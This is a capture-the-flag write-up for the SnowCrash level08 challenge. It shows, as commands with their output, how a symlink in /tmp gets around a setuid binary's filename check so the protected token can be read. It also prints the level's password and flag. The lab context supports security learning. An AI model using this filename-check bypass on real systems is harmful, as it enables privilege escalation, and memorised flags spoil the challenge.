### Exploit

This time around, we've got a binary file and text file, which contains a flag.

```
    level08@SnowCrash:~$ ls -l
    total 16
    -rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
    -rw-------  1 flag08 flag08    26 Mar  5  2016 token
    level08@SnowCrash:~$ ./level08
    ./level08 [file to read]
    level08@SnowCrash:~$ ./level08 token
    You may not access 'token'
```
We haven't got any permission on `token` as user `level08`. However, the binary file will print out the content of any file we own.

```
    level08@SnowCrash:~$ echo "test">/tmp/test
    level08@SnowCrash:~$ ls -l /tmp/test
    -rw-rw-r-- 1 level08 level08 6 Jan 13 17:20 /tmp/test
    level08@SnowCrash:~$ ./level08 /tmp/test
    test
```
This means the script opens, reads and writes the content of any file, even though it pertains to user `level08`. Obviously, we can't modify the permission rights of `token` with `chmod`, so we need to find a way around this constraint. This can be achieved using symbolic links and absolute paths.

```
  level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/key
  level08@SnowCrash:~$ cat /tmp/key
    cat: /tmp/key: Permission denied
  level08@SnowCrash:~$ ls -la /tmp/key
  lrwxrwxrwx 1 level08 level08 24 Dec 10 16:48 /tmp/key -> /home/user/level08/token
  level08@SnowCrash:~$ ./level08 /tmp/key
  quif5eloekouj29ke0vouxean
  level08@SnowCrash:~$ su flag08
  Password:
  Don't forget to launch getflag !
  flag08@SnowCrash:~$ getflag
  Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
This trick turns out to be very useful for the next couple of levels...
